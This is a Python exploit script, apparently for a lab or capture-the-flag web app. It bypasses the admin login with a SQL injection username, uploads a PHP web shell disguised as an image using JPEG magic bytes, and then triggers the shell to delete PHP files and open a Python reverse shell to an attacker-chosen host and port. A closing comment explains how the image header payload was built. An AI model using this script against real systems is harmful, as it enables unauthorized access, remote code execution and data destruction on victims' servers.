#!/usr/bin/env python3

import argparse
import random
import string
import sys

import requests


def admin_login(url):
    url = url + "/login.php"

    s = requests.Session()
    # s.proxies = {"http":"http://127.0.0.1:8080"}

    data = {"username": "admin'#", "password": "blah"}

    r = s.post(url, data=data, allow_redirects=False)

    if r.status_code != 302:
        print("[!] Wrong Creds Couldn't Login")
        print("[!] Check your Request, Exiting.")
        print()
        sys.exit()

    print("[+] Login Successfully")
    return s


def rand_filename(n):

    if n > 40:
        n = 40

    fname = ''.join(random.choice(string.ascii_letters) for _ in range(n))

    return fname


def upload(url, session):

    url = url + "/upload.php"

    fname = rand_filename(16) + ".php.png"

    # Read Last Of File to under stand how payload built
    payload = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01 <?php echo shell_exec($_REQUEST["cmd"]); ?>'

    files = [('image', (fname, payload, 'image/png'))]

    data = {'submit': 'Upload Image'}

    upload = session.post(url, data=data, files=files)

    if 'has been uploaded' in upload.text:
        print(f"[+] Shell {fname} UPloaded Successfully.")
        return fname
    else:
        print("[!] Shell not Uploaded!!")


def rce(url, session, fname, lhost, lport):

    url += f'/images/uploads/{fname}'

    shell = """
    rm -rf *.php*; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
    """.format(lhost, lport)

    data = {'cmd': shell}
    print("[*] Check your NetCat")
    shell = session.post(url, data=data)


def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--rhost", action="store", help="Remote HTTP IP", required=True)
    parser.add_argument("-l", "--lhost", action="store", help="Local Netcat IP", required=True)
    parser.add_argument("-p", "--lport", type=int, action="store", help="Local Netcat Port", required=True)

    args = parser.parse_args()
    rhost = args.rhost
    lhost, lport = args.lhost, args.lport

    url = f"http://{rhost}"

    print()
    session = admin_login(url)
    shell_fname = upload(url, session)
    rce(url, session, shell_fname, lhost, lport)
    print()


if __name__ == "__main__":
    main()

"""
    $ head -2 images.jpeg | xxd
        00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001  ......JFIF......
        00000010: 0001 0000 ffdb 0084 0009 0607 1013 1213  ................
        00000020: 1212 1310 1011 1210 1010 1712 1810 1010  ................
        00000030: 1310 1018 1516 1615 1215 1518 1d28 2018  .............( .
        00000040: 1a25 1b15 1521 3121 2529 2b2e 2e2e 171f  .%...!1!%)+.....
        00000050: 3338 332d 3728 2d2e 2b01 0a0a            383-7(-.+...

    I got this header for the image ffd8 ffe0 0010 4a46 4946 0001 0100 0001 0001

    using Python convert the hex to byte type
        x=bytes.fromhex("ffd8ffe000104a4649460001010000010001") convert hex to byte type
        payload = b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01 <?php echo shell_exec($_GET["cmd"]); ?>'

    To Read Cookie if needed 
    # print(s.cookies)
    # phpsession = list(s.cookies.get_dict().keys())[0]
    # cookie = s.cookies.get_dict().get(phpsession)
    # print(phpsession+"="+cookie)

"""
